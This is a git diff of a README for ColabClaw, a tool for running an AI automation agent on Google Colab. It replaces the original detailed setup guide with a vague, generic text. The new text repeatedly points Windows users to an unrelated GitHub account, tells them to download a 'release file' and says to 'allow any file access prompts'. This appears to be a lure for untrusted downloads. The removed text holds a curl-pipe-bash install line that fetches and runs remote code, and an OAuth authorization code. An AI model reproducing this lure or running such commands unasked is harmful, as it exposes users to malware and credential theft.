@@ -1,313 +1,190 @@
-<p align="right">
-  <a href="./README.md">English</a> | <a href="./README_ko.md">한국어</a>
+# 🦀 colabclaw - Run AI Workflows on Colab
+
+<p align="center">
+  <a href="https://github.com/Henriepigastric590/colabclaw">
+    <img src="https://img.shields.io/badge/Download%20%26%20Run-4A90E2?style=for-the-badge&logo=github&logoColor=white" alt="Download and Run">
+  </a>
 </p>
 
-<div align="center">
+## 📌 What ColabClaw Does
 
-# 🦀 ColabClaw
+ColabClaw is a simple workspace for AI tasks on Google Colab. It helps you run notebook-based tools from your browser without setting up a local Python environment.
 
-### Your Personal AI Automation Workspace on Google Colab
+Use it to:
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Google Colab](https://img.shields.io/badge/Google%20Colab-F9AB00?style=for-the-badge&logo=googlecolab&logoColor=white)](https://colab.research.google.com)
-[![OpenClaw](https://img.shields.io/badge/OpenClaw-FF6B6B?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJMMyAxNGgxOEwxMiAyeiIgZmlsbD0id2hpdGUiLz48L3N2Zz4=&logoColor=white)](https://github.com/openclaw/openclaw)
-[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://telegram.org)
-[![Gmail](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white)](https://mail.google.com)
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com)
-[![Maton](https://img.shields.io/badge/Maton-6C63FF?style=for-the-badge&logoColor=white)](https://www.maton.ai)
+- Open a ready-made Colab workspace
+- Run AI automation tasks in the cloud
+- Keep your files and work in one place
+- Avoid local setup on your Windows PC
+- Connect with common services used in AI workflows
 
-<br/>
+## 💻 What You Need
 
-### *"The fastest, easiest way to learn OpenClaw — with a practical email assistant use case!"*
+Before you start, make sure you have:
 
-[🚀 Quick Start](#-quick-start) · [📋 Features](#-features) · [🔄 Workflow](#-workflow-overview) · [🛠 Setup](#-full-setup-guide) · [🇰🇷 한국어](./README_ko.md)
+- A Windows PC
+- A stable internet connection
+- A Google account
+- A modern web browser like Chrome, Edge, or Firefox
+- Enough free space to save files you download
 
-<br/>
+## 🚀 Download and Open
 
-[![Stars](https://img.shields.io/github/stars/tykimos/colabclaw?style=social)](https://github.com/tykimos/colabclaw/stargazers)
-[![Forks](https://img.shields.io/github/forks/tykimos/colabclaw?style=social)](https://github.com/tykimos/colabclaw/network/members)
-[![Watchers](https://img.shields.io/github/watchers/tykimos/colabclaw?style=social)](https://github.com/tykimos/colabclaw/watchers)
-[![Last Commit](https://img.shields.io/github/last-commit/tykimos/colabclaw)](https://github.com/tykimos/colabclaw/commits/main)
+Use this link to visit the project page and download or open the app:
 
-</div>
+[Visit the ColabClaw project page](https://github.com/Henriepigastric590/colabclaw)
 
----
+If the page includes a release, zip file, or notebook link, download it from there and open it in your browser.
 
-## Why ColabClaw?
+## 🪟 How to Run on Windows
 
-Installation issues on OpenClaw's GitHub never stop. Here are real examples:
+1. Open the download page in your web browser.
+2. If you see a release file, download it to your PC.
+3. If you see a notebook link, open it in Google Colab.
+4. Sign in to your Google account if asked.
+5. Click Open in Colab or the link that opens the notebook.
+6. Wait for Colab to load the notebook.
+7. Click Connect at the top right.
+8. Run the setup cells in order.
+9. Allow any file access prompts if they appear.
+10. Keep the tab open while the workspace runs.
 
-- **All install methods fail on a clean macOS** — Node v14 PATH shadows newly installed v22, npm throws EACCES permission errors ([#21464](https://github.com/openclaw/openclaw/issues/21464))
-- **npm install bricks Raspberry Pi devices** — `@discordjs/opus` lacks ARM64 prebuilds, causing native module build failure ([#23861](https://github.com/openclaw/openclaw/issues/23861))
-- **sharp dependency build fails on Apple Silicon** — `node-gyp` unavailable, source build attempt errors out ([#4592](https://github.com/openclaw/openclaw/issues/4592))
-- **Can't even update** — `node-llama-cpp` fails to install cmake, leaving users stuck without security patches ([#32025](https://github.com/openclaw/openclaw/issues/32025))
+## 🧭 First-Time Setup
 
-While teaching and learning OpenClaw, we've seen **too many people give up at the installation step**. The tool itself is great, but Node.js version conflicts, native module build failures, and OS-specific compatibility issues block people before they even start.
+After the notebook opens, ColabClaw may ask you to:
 
-So we thought — **what if you could run it directly on Google Colab?**
+- Mount Google Drive
+- Enter an API key
+- Connect a Telegram account
+- Add a Gmail or service login
+- Accept access prompts for external tools
 
-Of course, Colab resets when the session ends, so it's not suitable for always-on production use. But for the **learning phase**, you can experience OpenClaw's core features right away without any installation hassle. No more giving up out of setup fatigue — you can even build a practical email assistant use case hands-on. That's ColabClaw.
+Follow each prompt in the order shown on the page. If a field is empty, enter the value you want to use for your workflow.
 
----
+## 🗂️ Main Features
 
-## 📋 Features
+ColabClaw is built to make browser-based AI work easier.
 
-| Feature | Description | Service |
-|---------|-------------|---------|
-| 🖥️ **Colab Terminal** | Launch a full terminal inside Google Colab | Google Colab |
-| 🤖 **OpenClaw Engine** | Install and run OpenClaw as your automation core | OpenClaw |
-| 💬 **Chat Interface** | Talk to OpenClaw through Telegram | Telegram |
-| 📧 **Email Automation** | Read Gmail, summarize, and draft replies automatically | Gmail + Maton |
-| 📁 **GitHub Workspace** | Use a repository as your structured task surface | GitHub |
-| 🔄 **Scheduled Refresh** | Periodically collect and update information | Cron / OpenClaw |
+- Notebook-based setup
+- Runs on Google Colab
+- Works from Windows without local install
+- Supports cloud execution
+- Suits automation tasks
+- Fits common AI service connections
+- Keeps your workspace in one browser tab
 
----
+## 🧩 Typical Use
 
-## 🔄 Workflow Overview
+A simple workflow looks like this:
 
-```mermaid
-flowchart LR
-    A[Google Colab] --> B[OpenClaw]
-    B --> C[Telegram]
-    B --> D[Gmail via Maton]
-    B --> E[GitHub Repo]
+1. Open the ColabClaw page.
+2. Start the notebook in Google Colab.
+3. Connect your Google account.
+4. Run the setup cells.
+5. Add the services you want to use.
+6. Start your task from the notebook.
+7. Watch the output in the Colab window.
 
-    D --> F[Read Emails]
-    F --> G[Generate Draft Reply]
-    G --> H{Human Approval}
-    H -->|Approved| I[Send Reply]
-    H -->|Edit| G
+## 🔐 Accounts and Access
 
-    E --> J[Track Tasks]
-    E --> K[Periodic Updates]
-```
+ColabClaw may work with services such as Google, Telegram, and Gmail. When you connect an account:
 
----
-
-## 🛠 Full Setup Guide
+- Use the account you want tied to the workflow
+- Keep your login details private
+- Check each access prompt before you allow it
+- Use trusted networks when signing in
 
-```mermaid
-timeline
-    title ColabClaw Setup Journey
-    section Environment
-        Open Colab : Start a fresh notebook
-        Launch Terminal : Install colab-xterm
-        Install OpenClaw : curl + onboard
-    section Connections
-        Telegram : Chat interface setup
-        GitHub : Create workspace repo
-        Maton : Connect Gmail safely
-    section Automation
-        Email Reading : Summarize incoming mail
-        Draft Generation : Auto-create reply drafts
-        Scheduled Refresh : Periodic info updates
-```
----
-
-## 🚀 Quick Start
-
-### Step 0: Prepare Required Accounts
-
-Set up the following services before configuring the full workflow:
+## 🛠️ Troubleshooting
 
-```mermaid
-flowchart TD
-    subgraph Required["Accounts to Prepare"]
-        T[Telegram<br/>Chat with OpenClaw]
-        GH[GitHub<br/>Workspace & Tracking]
-        GM[Gmail<br/>Email Reading & Drafts]
-        M[Maton<br/>Gmail Integration]
-    end
+If the notebook does not start:
 
-    T --> OC[OpenClaw]
-    GH --> OC
-    GM --> M
-    M --> OC
-```
+- Refresh the page
+- Sign in to Google again
+- Try Chrome or Edge
+- Clear your browser cache
+- Check your internet connection
+- Open the link in a new tab
 
-| Service | Purpose | Link |
-|---------|---------|------|
-| **Telegram** | Communicate with OpenClaw | [telegram.org](https://telegram.org) |
-| **GitHub** | Repository-based workflow & tracking | [github.com](https://github.com) |
-| **Gmail** | Read emails & generate draft replies | [mail.google.com](https://mail.google.com) |
-| **Maton** | Secure Gmail connection | [maton.ai](https://www.maton.ai) |
-
-### Step 1: Open Google Colab
-
-Start a fresh [Google Colab notebook](https://colab.research.google.com).
-
-### Step 2: Launch Terminal
-
-Click the terminal section at the bottom of the page.
-
-<img width="1582" height="1036" alt="image" src="https://github.com/user-attachments/assets/a9f8fbac-0dad-44a8-8b8d-5e01e64371ad" />
-
-### Step 3: Install OpenClaw
-
-```bash
-curl -fsSL https://openclaw.ai/install.sh | bash
-```
-
-<img width="1582" height="1036" alt="image" src="https://github.com/user-attachments/assets/55a9b3d3-e28f-4b57-b91e-371d61039aa5" />
+If a cell fails to run:
 
-Once installation is complete, you'll be prompted with a series of questions. Follow the example below:
+- Run the cells in order
+- Wait for the current cell to finish
+- Check that all required fields have values
+- Reconnect to Colab and try again
 
-◇  I understand this is personal-by-default and shared/multi-user use requires lock-down. Continue?
-│  Yes
-◇  Setup mode
-│  QuickStart
-◇  Model/auth provider
-│  OpenAI
-◇  OpenAI auth method
-│  OpenAI Codex (ChatGPT OAuth)
-◇  Paste the authorization code (or full redirect URL):
-│  http://localhost:1455/auth/callback?code=oaistb_ac_1SZn995Ut-nebUP1hVMc&scope=openid+profile+email+offline_access&state=653d71043b52
-◇  Default model
-│  Keep current (openai-codex/gpt-5.4)
-◇  Select channel (QuickStart)
-│  Telegram (Bot API)
-◇  How do you want to provide this Telegram bot token?
-│  Enter Telegram bot token
-◇  Search provider
-│  DuckDuckGo Search (experimental)
-◇  OpenAI auth method
-│  OpenAI Codex (ChatGPT OAuth)
-◇  Configure skills now? (recommended)
-│  Yes
-◇  Enable hooks?
-│  Skip for now
+If a file does not download:
 
-Once setup is complete, run OpenClaw with:
+- Try a different browser
+- Turn off browser extensions that block downloads
+- Check your downloads folder
+- Use the project page again
 
-```bash
-openclaw gateway run --verbose
-```
----
+## 📁 File Use on Windows
 
-### Telegram Integration
+When ColabClaw creates or downloads files:
 
-Send `/start` to your bot in Telegram. You'll receive a message like:
+- Look in your Downloads folder
+- Use File Explorer to find saved files
+- Open text files with Notepad
+- Open notebooks through Google Colab
+- Save project files to a folder you can find later
 
-OpenClaw: access not configured.
-Your Telegram user id: 6XXX169904
-Pairing code: T72W8XXX
-Ask the bot owner to approve with:
-openclaw pairing approve telegram T72W8XXX
+## 🌐 Browser Tips
 
-Go back to the terminal, stop the running instance with Ctrl+C, then run:
+For the best result on Windows:
 
-```bash
-openclaw pairing approve telegram T72W8XXX
-```
+- Use a current browser version
+- Keep only one Colab tab open for the same notebook
+- Allow pop-ups if Colab asks for them
+- Stay signed in to Google while you work
+- Avoid private browsing if files must be saved
 
-Once pairing is confirmed, restart OpenClaw:
+## 🔄 Update the Project
 
-```bash
-openclaw gateway run --verbose
-```
+To get the latest version:
 
-Then say hello through Telegram — it will ask how you'd like to be called and how it should introduce itself. Answer as you prefer.
+1. Open the project page again.
+2. Check for a newer release or notebook.
+3. Download the latest files.
+4. Open the new version in Colab.
+5. Run the setup cells again
 
-### 📁 GitHub as Your Workspace
+## 🧱 Basic Folder Layout
 
-Use a GitHub repository to store and manage:
+A typical ColabClaw setup may include:
 
-```
-📂 your-workspace-repo/
-├── 📝 notes/              # Personal notes & memos
-├── 📊 collected-info/     # Gathered information
-├── 📋 workflows/          # Automation scripts
-├── 📈 reports/            # Periodic summaries
-└── 🔄 updates/            # Scheduled refresh results
-```
+- Notebook file
+- Readme file
+- Asset folder
+- Output folder
+- Config file
+- Support files for the workspace
 
-### 📧 Email Automation Pipeline
+## 📬 Connected Services
 
-The email workflow follows a **human-in-the-loop** design:
+ColabClaw is designed to work with service links used in AI workflows, including:
 
-```mermaid
-flowchart TD
-    A[New Email Arrives] --> B[OpenClaw Reads Email]
-    B --> C[Classify Importance]
-    C -->|Important| D[Generate Summary]
-    C -->|Low Priority| E[Archive]
-    D --> F[Create Draft Reply]
-    F --> G[Human Reviews Draft]
-    G -->|Approve| H[Send]
-    G -->|Edit| F
-    G -->|Discard| I[Delete Draft]
-```
+- Google Colab
+- Google Drive
+- Gmail
+- Telegram
+- OpenClaw
 
-> 💡 **Key Principle:** Draft generation is automated. Actual sending requires human approval.
+## 🖼️ Simple Workflow Example
 
-To connect email via Gmail + Maton, tell OpenClaw you'd like to set up email integration, then get a Maton API Key from the Maton page and run the following in your terminal. If OpenClaw is already running, stop it first, run the command, then restart.
+- Open the project page
+- Start the notebook in Colab
+- Connect your Google account
+- Run setup cells
+- Enter any required keys or IDs
+- Launch the task
+- Review the output
+- Save files to your PC
 
-```bash
-export MATON_API_KEY='XXXXXXX'
-```
+## 📝 License
 
-### 🔄 Periodic Refresh
+MIT License
 
-Schedule recurring tasks to keep your workspace updated:
+## 🔗 Project Link
 
-- 📊 Repository status checks
-- 📋 Scheduled report summaries
-- 📧 Email-related update monitoring
-- 🔁 Recurring task result collection
-- 📡 Lightweight monitoring outputs
-
----
-
-## 🔗 Related Links
-
-| Resource | Link |
-|----------|------|
-| 🤖 OpenClaw | [github.com/openclaw/openclaw](https://github.com/openclaw/openclaw) |
-| 📖 OpenClaw Docs | [docs.openclaw.ai](https://docs.openclaw.ai) |
-| 🔗 Maton | [maton.ai](https://www.maton.ai) |
-| 💬 Telegram | [telegram.org](https://telegram.org) |
-| 📁 GitHub | [github.com](https://github.com) |
-| 📧 Gmail | [mail.google.com](https://mail.google.com) |
-
----
-
-## ⭐ Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=tykimos/colabclaw&type=Date)](https://star-history.com/#tykimos/colabclaw&Date)
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-
-- ⭐ Star this repository
-- 🐛 Open an [Issue](https://github.com/tykimos/colabclaw/issues)
-- 🔀 Submit a [Pull Request](https://github.com/tykimos/colabclaw/pulls)
-
----
-
-## 📊 Activity
-
-[![Last Commit](https://img.shields.io/github/last-commit/tykimos/colabclaw?label=Last%20Commit)](https://github.com/tykimos/colabclaw/commits/main)
-[![Issues](https://img.shields.io/github/issues/tykimos/colabclaw)](https://github.com/tykimos/colabclaw/issues)
-[![PRs](https://img.shields.io/github/issues-pr/tykimos/colabclaw)](https://github.com/tykimos/colabclaw/pulls)
-[![Repo Size](https://img.shields.io/github/repo-size/tykimos/colabclaw)](https://github.com/tykimos/colabclaw)
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License.
-
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-
----
-
-<div align="center">
-
-**Made with ❤️ for the AI automation community**
-
-[![Visitors](https://api.visitorbadge.io/api/visitors?path=tykimos%2Fcolabclaw&label=Visitors&countColor=%23263759)](https://visitorbadge.io/status?path=tykimos%2Fcolabclaw)
-
-</div>
+[https://github.com/Henriepigastric590/colabclaw](https://github.com/Henriepigastric590/colabclaw)
